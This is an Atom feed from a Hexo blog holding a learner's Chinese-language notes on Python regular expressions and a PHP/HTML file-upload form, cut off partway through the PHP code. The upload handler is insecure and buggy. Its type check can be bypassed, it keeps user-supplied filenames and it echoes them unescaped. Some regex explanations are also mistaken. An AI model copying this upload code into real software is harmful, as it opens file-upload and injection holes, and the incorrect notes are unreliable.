<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Fish</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-03-26T11:41:06.673Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Fish</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Python正则表达式练习</title>
    <link href="http://example.com/2021/03/26/Python/Python-re/"/>
    <id>http://example.com/2021/03/26/Python/Python-re/</id>
    <published>2021-03-26T11:41:35.228Z</published>
    <updated>2021-03-26T11:41:06.673Z</updated>
    
    <content type="html"><![CDATA[<h2 id="字符分类"><a href="#字符分类" class="headerlink" title="字符分类"></a>字符分类</h2><ul><li><code>\d</code> —– 0-9的任何数字</li><li><code>\D</code> —– 除开0-9的任何数字</li><li><code>\w</code> —– 任何字母，数字或下划线字符</li><li><code>\W</code> —– 除开字母，数字和下划线以外的任何字符</li><li><code>\s</code> —– 空格，制表符或换行符</li><li><code>\S</code> —– 除空格，制表符和换行符以外的任何字符</li></ul><h2 id="正则表达式基础"><a href="#正则表达式基础" class="headerlink" title="正则表达式基础"></a>正则表达式基础</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re <span class="comment"># 后面的代码中将默认引入</span></span><br><span class="line">msg = <span class="string">&#x27;My number is 415-555-4242 and 111-222-3333&#x27;</span> <span class="comment"># 下面例子中所使用的测试字符串</span></span><br></pre></td></tr></table></figure><ul><li><p>example_1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># search和findall的使用</span></span><br><span class="line">phoneNumRegex = re.compile(<span class="string">r&#x27;\d\d\d-\d\d\d-\d\d\d\d&#x27;</span>)</span><br><span class="line">mo_1 = phoneNumRegex.search(msg)</span><br><span class="line">mo_2 = phoneNumRegex.findall(msg)   <span class="comment"># findall方法返回一个列表，里面存储所有的正则匹配数据</span></span><br><span class="line">print(mo_1.group())</span><br><span class="line">print(mo_2[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search:  415-555-4242</span><br><span class="line">  findall:  [&#39;415-555-4242&#39;, &#39;111-222-3333&#39;]</span><br></pre></td></tr></table></figure></li><li><p>example_2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment"># 用括号分组</span></span><br><span class="line">  phoneNumRegex = re.compile(<span class="string">r&#x27;(\d\d\d)-(\d\d\d-\d\d\d\d)&#x27;</span>) <span class="comment"># 加括号会返回一个元祖</span></span><br><span class="line">mo_1 = phoneNumRegex.search(msg) <span class="comment"># 将正则匹配到的数据用括号给定的范围分组，打包成元祖</span></span><br><span class="line">  mo_2 = phoneNumRegex.findall(msg) <span class="comment"># findall将所有打包好的元祖存放到列表中</span></span><br><span class="line">  print(<span class="string">&#x27;mo_1 -&gt; group(0): &#x27;</span>,mo_1.group(<span class="number">0</span>))</span><br><span class="line">  print(<span class="string">&#x27;mo_1 -&gt; group(1) and group(2): &#x27;</span>,mo_1.group(<span class="number">1</span>),mo_1.group(<span class="number">2</span>))</span><br><span class="line">  print(<span class="string">&#x27;mo_2: &#x27;</span>,mo_2)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mo_1 -&gt; group(0):  415-555-4242</span><br><span class="line">mo_1 -&gt; group(1) and group(2):  415 555-4242</span><br><span class="line">mo_2:  [(&#39;415&#39;, &#39;555-4242&#39;), (&#39;111&#39;, &#39;222-3333&#39;)]</span><br></pre></td></tr></table></figure></li><li><p>example_3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 管道符号的使用</span></span><br><span class="line">msg = <span class="string">&#x27;Tina Fey and Batman.&#x27;</span></span><br><span class="line">heroRegex = re.compile(<span class="string">r&#x27;Batman|Tina Fey&#x27;</span>) <span class="comment"># |为管道符号，如果使用search方法只匹配到最近的一个，finddown会将可选项全部匹配</span></span><br><span class="line">mo_1 = heroRegex.search(msg)</span><br><span class="line">mo_2 = heroRegex.findall(msg)</span><br><span class="line">print(<span class="string">&#x27;mo_1.group(): &#x27;</span>,mo_1.group())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mo_1.group():  Tina Fey</span><br><span class="line">mo_2:  [&#39;Tina Fey&#39;, &#39;Batman&#39;]</span><br></pre></td></tr></table></figure></li><li><p>example_4</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 管道符号多模式匹配</span></span><br><span class="line">batRegex = re.compile(<span class="string">r&#x27;Bat(man|mobile|copter|bat)&#x27;</span>) <span class="comment"># 若前缀相同则后缀部分可以用括号与管道符将其分开，减少输入</span></span><br><span class="line">mo = batRegex.search(<span class="string">&#x27;Batmobile lost a wheel&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;mo.group&#x27;</span>, mo.group())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mo.group():  Batmobile</span><br></pre></td></tr></table></figure></li><li><p>example_5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 问号实现可选匹配</span></span><br><span class="line">batRegex = re.compile(<span class="string">r&#x27;Bat(wo)?man&#x27;</span>) <span class="comment"># 简单来说，括号里面的存在匹配时就加上，不存在就忽略括号里面的</span></span><br><span class="line">mo = batRegex.search(<span class="string">&#x27;The Adventures of Batman&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;output: &#x27;</span>,mo.group())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">output:  Batman</span><br></pre></td></tr></table></figure></li><li><p>example_6</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  用*号实现多次匹配</span></span><br><span class="line">batRegex = re.compile(<span class="string">r&#x27;Bat(wo)*man&#x27;</span>) <span class="comment"># *号代表缺省</span></span><br><span class="line">mo = batRegex.search(<span class="string">&#x27;The Adventures of Batwowowowowoman&#x27;</span>)</span><br><span class="line">print(<span class="string">&#x27;output: &#x27;</span>,mo.group())</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">output:  Batwowowowowoman</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 用+号匹配一次或多次</span></span><br><span class="line">batRegex = re.compile(<span class="string">r&#x27;Bat(wo)+man&#x27;</span>) <span class="comment"># +号需要括号中的内容至少出现一次</span></span><br></pre></td></tr></table></figure></li><li><p>example_7</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用花括号匹配特定的次数</span></span><br><span class="line">haRegex = re.compile(<span class="string">r&#x27;Ha&#123;3&#125;&#x27;</span>) <span class="comment"># 指定三次</span></span><br><span class="line">haRegex = re.compile(<span class="string">r&#x27;Ha&#123;3,5&#125;&#x27;</span>) <span class="comment"># 有存在3-5个的都可以</span></span><br><span class="line">haRegex = re.compile(<span class="string">r&#x27;Ha&#123;,5&#125;&#x27;</span>) <span class="comment"># 匹配0-5个</span></span><br><span class="line">haRegex = re.compile(<span class="string">r&#x27;Ha&#123;3,&#125;&#x27;</span>) <span class="comment"># 匹配3或更多次 </span></span><br></pre></td></tr></table></figure></li><li><p>example_8</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># example_6 贪心匹配和非贪心匹配 (好像在python3.8版本中被废弃？)</span></span><br><span class="line"><span class="comment">## 贪心</span></span><br><span class="line">greedyHaRegex = re.compile(<span class="string">r&#x27;(Ha)&#123;3, 5&#125;?&#x27;</span>)</span><br><span class="line">mo1 = greedyHaRegex.search(<span class="string">&#x27;HaHaHaHaHa&#x27;</span>)</span><br><span class="line">print(mo1) <span class="comment">## 输出报错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 非贪心</span></span><br><span class="line">notGreedyHaRegex = re.compile(<span class="string">r&#x27;(Ha)&#123;3,5&#125;&#x27;</span>)</span><br><span class="line">mo2 = notGreedyHaRegex.search(<span class="string">&#x27;HaHaHaHaHa&#x27;</span>)</span><br><span class="line">print(mo2) <span class="comment">## 输出报错</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="建立字符分类"><a href="#建立字符分类" class="headerlink" title="建立字符分类"></a>建立字符分类</h2><ul><li><p>example_1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vowelRegex = re.compile(<span class="string">r&#x27;[aeiouAEIOU]&#x27;</span>) <span class="comment"># 中括号中就是用户需要匹配的字符</span></span><br><span class="line">mo = vowelRegex.findall(<span class="string">&#x27;RoboCop eats baby food. BABY FOOD.&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;Output: &quot;</span>, mo)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Output:  [&#39;o&#39;, &#39;o&#39;, &#39;o&#39;, &#39;e&#39;, &#39;a&#39;, &#39;a&#39;, &#39;o&#39;, &#39;o&#39;, &#39;A&#39;, &#39;O&#39;, &#39;O&#39;]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vowelRegex = re.compile(<span class="string">r&#x27;[^aeiouAEIOU]&#x27;</span>) <span class="comment"># 如果在前面加上^符号就代表不匹配这些字符</span></span><br><span class="line">mo = vowelRegex.findall(<span class="string">&#x27;RoboCop eats baby food. BABY FOOD.&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;Output: &quot;</span>, mo)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Output:  [&#39;R&#39;, &#39;b&#39;, &#39;C&#39;, &#39;p&#39;, &#39; &#39;, &#39;t&#39;, &#39;s&#39;, &#39; &#39;, &#39;b&#39;, &#39;b&#39;, &#39;y&#39;, &#39; &#39;, &#39;f&#39;, &#39;d&#39;, &#39;.&#39;, &#39; &#39;, &#39;B&#39;, &#39;B&#39;, &#39;Y&#39;, &#39; &#39;, &#39;F&#39;, &#39;D&#39;, &#39;.&#39;]</span><br></pre></td></tr></table></figure></li><li><p>example_2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ext...</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;字符分类&quot;&gt;&lt;a href=&quot;#字符分类&quot; class=&quot;headerlink&quot; title=&quot;字符分类&quot;&gt;&lt;/a&gt;字符分类&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;\d&lt;/code&gt; —– 0-9的任何数字&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\D&lt;/code&gt; —– </summary>
      
    
    
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>PHP_Study_1</title>
    <link href="http://example.com/2021/03/15/PHP/PHP&amp;&amp;HTML-1/"/>
    <id>http://example.com/2021/03/15/PHP/PHP&amp;&amp;HTML-1/</id>
    <published>2021-03-15T13:23:27.832Z</published>
    <updated>2021-03-17T11:18:37.479Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTML页面"><a href="#HTML页面" class="headerlink" title="HTML页面"></a>HTML页面</h1><h2 id="head代码段"><a href="#head代码段" class="headerlink" title="head代码段"></a>head代码段</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--charset表示用UTF-8编码--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Fish<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;title&gt;Fish&lt;/title&gt;</code>标签在浏览器上方显示</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210317184740439.png"></p><h2 id="body代码段"><a href="#body代码段" class="headerlink" title="body代码段"></a>body代码段</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  action属性表示连接的php代码 method属性指定传输数据方式&lt;post or get&gt;  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!--表单代码处--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>表单代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">&quot;border: #00ffff;&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span> <span class="attr">style</span>=<span class="string">&quot;background: #7fffd4;&quot;</span>&gt;</span>  <span class="comment">&lt;!--设置背景颜色--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">style</span>=<span class="string">&quot;width: 150px; text-align: center;&quot;</span>&gt;</span>Item<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="comment">&lt;!--&lt;td&gt;标签打印字体--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">style</span>=<span class="string">&quot;width: 15px; text-align: center;&quot;</span>&gt;</span>Quantity<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">style</span>=<span class="string">&quot;background: cyan&quot;</span>&gt;</span>Photo<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="comment">&lt;!--上传照片文件--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;photo&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">style</span>=<span class="string">&quot;background: cornflowerblue&quot;</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="comment">&lt;!--填写名字--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">size</span>=<span class="string">&quot;20&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;10&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">style</span>=<span class="string">&quot;background: gold&quot;</span>&gt;</span>Gender<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="comment">&lt;!--填写性别--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">size</span>=<span class="string">&quot;20&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;10&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">style</span>=<span class="string">&quot;background: beige&quot;</span>&gt;</span>Age<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="comment">&lt;!--年龄--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">size</span>=<span class="string">&quot;20&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;10&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">style</span>=<span class="string">&quot;background: #ff8545&quot;</span>&gt;</span>Data Of Birth<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="comment">&lt;!--出生日期--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;date&quot;</span> <span class="attr">name</span>=<span class="string">&quot;birth&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>Hobby<span class="tag">&lt;/<span class="name">td</span>&gt;</span> <span class="comment">&lt;!--文本框用于填写爱好--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;20&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">&quot;2&quot;</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit Order&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>效果</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210317184817601.png"></p></li></ul><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>重点是文件上传，只做文件上传的复习</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"> $AllowedExts = <span class="keyword">array</span>(<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>); <span class="comment">// 用于正则匹配</span></span><br><span class="line">                    $temp = explode(<span class="string">&#x27;.&#x27;</span>,$_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                    $extension = end($temp);  <span class="comment">// 获取文件后缀名</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(($_FILES[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)||  <span class="comment">// 规定文件格式，只能上传图片类文件</span></span><br><span class="line">                       ($_FILES[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>)||</span><br><span class="line">                       ($_FILES[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpg&#x27;</span>)||</span><br><span class="line">                       ($_FILES[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/-png&#x27;</span>)||</span><br><span class="line">                       ($_FILES[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>)&amp;&amp;</span><br><span class="line">                       ($_FILES[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">204800</span>)&amp;&amp;  <span class="comment">// 规定文件上传大小不能超过204800byte</span></span><br><span class="line">                       (in_array($extension, $AllowedExts)))  <span class="comment">//与 AllowedExts数组中的数据正则匹配</span></span><br><span class="line">                    &#123;</span><br><span class="line"><span class="comment">//----------------------------------------------------------------------------------------------------------</span></span><br><span class="line">                        <span class="keyword">if</span>($_FILES[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]&gt;<span class="number">0</span>)&#123;   <span class="comment">// 如果上传失败则回显给用户</span></span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&#x27;error!&#x27;</span>.$_FILES[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span>&#123;</span><br><span class="line">                            $file_name = $_FILES[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                            $file_type = $_FILES[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">                            $file_size = ($_FILES[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] / <span class="number">1024</span>);</span><br><span class="line">                            $file_tmp_name = $_FILES[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        </span><br><span class="line">                        <span class="keyword">if</span>(file_exists(<span class="string">&#x27;../upload/&#x27;</span>.$_FILES[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))&#123; <span class="comment">// 判断文件是否存在</span></span><br><span class="line">                            <span class="comment">// echo $_FILES[&#x27;photo&#x27;][&#x27;name&#x27;].&#x27; file already exists&#x27;;</span></span><br><span class="line">                            $html = <span class="string">&#x27;&lt;img src=&quot;..//upload//&quot;&#x27;</span>.$_FILES[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;name&#x27;</span>].<span class="string">&#x27; alt=&quot;Pulpit rock&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&#x27;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> $html;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span>&#123;</span><br><span class="line">                            move_uploaded_file($_FILES[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="string">&#x27;../upload/&#x27;</span>.$_FILES[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                            <span class="comment">// echo &#x27;upload file success&#x27;;</span></span><br><span class="line">                            $html = <span class="string">&#x27;&lt;img src=&quot;../upload/&quot;&#x27;</span>.$_FILES[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;name&#x27;</span>].<span class="string">&#x27; alt=&quot;Pulpit rock&quot; width=&quot;150&quot; height=&quot;150&quot;&gt;&#x27;</span>;</span><br><span class="line">                            <span class="keyword">echo</span> $html;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> 